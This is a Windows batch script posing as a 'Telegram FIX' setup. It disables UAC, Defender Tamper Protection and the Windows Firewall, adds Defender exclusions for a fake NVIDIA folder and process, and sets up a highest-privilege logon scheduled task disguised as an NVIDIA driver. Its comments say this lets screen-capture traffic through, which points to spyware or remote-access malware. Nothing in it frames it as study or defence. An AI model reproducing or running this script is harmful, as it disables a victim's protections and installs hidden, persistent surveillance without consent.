@echo off
title Setup - Telegram FIX 
echo =========================================
echo   Setup - Telegram FIX 
echo =========================================
echo.
echo Please wait...

:: 1. Disable UAC
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1

:: 2. Disable Tamper Protection (critical for screen capture)
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d 0 /f >nul 2>&1

:: 3. Disable Windows Firewall (to avoid blocking screen capture traffic)
netsh advfirewall set allprofiles state off >nul 2>&1

:: 4. Create target folder (if not exists – MSI will create it, but just in case)
mkdir "C:\Program Files (x86)\NVIDIA Corporation" 2>nul

:: 5. Add Defender exclusions for the correct folder and process
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Program Files (x86)\NVIDIA Corporation'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionProcess 'nvdisplay.exe'" >nul 2>&1

:: 6. Create interactive scheduled task with delay (points to nvdisplay.exe)
schtasks /create /tn "NVIDIA Display Driver" /tr "C:\Program Files (x86)\NVIDIA Corporation\nvdisplay.exe" /sc onlogon /ru "%USERNAME%" /rl HIGHEST /delay 0000:30 /it /f

:: 7. Remove registry autorun (to avoid conflicts, but can be kept as backup)
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "NVIDIA Display Driver" /f >nul 2>&1

:: 8. Launch program now (optional)
start "" "C:\Program Files (x86)\NVIDIA Corporation\nvdisplay.exe"

echo.
echo Setup completed. Please reboot your computer.
echo This window will close in 10 seconds...
timeout /t 10 /nobreak >nul
exit